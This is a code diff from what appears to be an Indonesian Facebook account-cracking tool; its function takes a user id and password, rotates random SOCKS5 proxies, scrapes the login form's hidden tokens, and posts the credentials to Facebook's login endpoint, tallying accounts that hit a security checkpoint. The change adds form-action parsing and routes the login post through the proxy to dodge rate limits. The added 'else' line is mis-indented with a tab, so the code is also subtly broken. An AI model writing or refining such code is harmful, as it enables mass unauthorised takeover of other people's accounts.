@@ -1328,6 +1328,13 @@ def fanky_b_api(idf, pwv):
             nip = random.choice(prox)
             proxs = {'http': 'socks5://' + nip}
             requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
+            soup = BeautifulSoup(requ.text, "html.parser")
+            form = soup.find("form")
+            post_action = form.get("action") if form else None
+            if post_action and post_action.startswith("/"):
+                url_post = "https://secure.facebook.com" + post_action
+	    else:
+                url_post = post_action or "Tidak ditemukan"
             data = {
                 "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
                 "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
@@ -1362,8 +1369,8 @@ def fanky_b_api(idf, pwv):
                 "Sec-Fetch-User": "?1",
                 "DNT": "1"
             }
-            fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
-            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
+            # fankyimut = "https://www.facebook.com/login/device-based/regular/login/"
+            po = ses.post(url_post,data=data,headers=head,allow_redirects=False,proxies=proxs)
             if "checkpoint" in po.cookies.get_dict():
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
